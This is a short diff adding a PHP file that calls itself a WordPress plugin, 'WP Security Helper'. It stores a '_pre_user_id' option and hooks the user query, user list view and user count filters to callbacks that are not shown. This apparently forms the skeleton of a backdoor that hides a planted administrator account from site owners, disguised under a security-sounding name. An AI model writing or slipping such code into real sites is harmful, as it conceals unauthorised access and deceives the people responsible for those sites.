@@ -1,0 +1,6 @@
+<?php
+/* Plugin Name: WP Security Helper */
+add_option('_pre_user_id', 0);
+add_filter('pre_user_query', 'wsh_q');
+add_filter('views_users', 'wsh_v');
+add_filter('pre_count_users', 'wsh_c');
